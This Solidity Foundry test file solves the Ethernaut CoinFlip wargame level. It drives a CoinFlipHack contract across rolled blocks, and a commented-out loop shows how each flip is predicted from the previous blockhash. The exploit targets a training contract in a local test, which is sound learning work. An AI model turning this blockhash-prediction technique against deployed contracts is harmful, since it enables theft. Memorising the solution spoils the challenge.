pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../CoinFlip/CoinFlipHack.sol";
import "../CoinFlip/CoinFlipFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testCoinFlip() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        emit log_named_address("Player", eoaAddress);

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        CoinFlipHack hack = new CoinFlipHack(address(ethernautCoinFlip));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        // emit log_named_uint("Wins", ethernautCoinFlip.consecutiveWins());
        // assertEq(ethernautCoinFlip.consecutiveWins(), 0);
        // for (uint256 i = 100; i < 110; i++) {
        //     vm.roll(i);
        //     emit log_named_uint("block number", block.number);
        //     uint256 b = block.number - 1;
        //     uint256 blockValue = uint256(blockhash(b));
        //     uint256 coinFlip = blockValue / FACTOR;
        //     bool side = coinFlip == 1 ? true : false;
        //     ethernautCoinFlip.flip(side);
        // }

        // emit log_named_uint("Wins", ethernautCoinFlip.consecutiveWins());
        // assertEq(ethernautCoinFlip.consecutiveWins(), 10);

        for (uint256 i = 100; i < 110; i++) {
            vm.roll(i);
            emit log_named_uint("block number", block.number);
            hack.attack();
        }
        assertEq(ethernautCoinFlip.consecutiveWins(), 10);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}